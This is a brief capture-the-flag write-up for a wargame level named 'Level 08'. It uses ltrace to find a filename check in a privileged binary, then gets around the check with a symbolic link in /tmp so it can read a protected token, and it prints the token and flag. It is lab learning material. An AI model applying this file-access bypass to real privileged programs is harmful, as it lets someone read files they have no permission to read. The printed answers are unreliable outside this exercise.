# Level 08

A binary with flag08 permissions and a token can be found in the directory

```bash
ltrace ./level08 token
__libc_start_main(0x8048554, 2, 0xbffff7d4, 0x80486b0, 0x8048720 <unfinished ...>
strstr("token", "token")                                                  = "token"
printf("You may not access '%s'\n", "token"You may not access 'token'
)                              = 27
exit(1 <unfinished ...>
+++ exited (status 1) +++
```

There is a hardcoded check for token filename that prevents execution. By creating a symbolic link to the token we can run the script.

```bash
ln -s /home/user/level08/token /tmp/link
./level08 /tmp/link
# quif5eloekouj29ke0vouxean

getflag
# Check flag.Here is your token : 25749xKZ8L7DkSCwJkT9dyv6f
```